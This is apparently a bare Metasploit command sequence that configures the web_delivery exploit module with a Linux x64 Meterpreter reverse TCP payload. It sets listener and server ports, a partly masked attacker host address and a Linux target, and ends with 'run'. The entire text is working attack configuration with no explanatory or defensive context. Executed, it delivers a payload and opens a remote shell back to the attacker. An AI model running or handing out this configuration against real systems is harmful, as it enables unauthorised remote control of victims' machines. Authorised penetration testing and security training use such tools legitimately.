use exploit/multi/script/web_delivery
set payload linux/x64/meterpreter/reverse_tcp
set srvport 2127
set lhost 124.x.x.x
set srvhost 0.0.0.0
set lport 2126
set target 7 # linux
run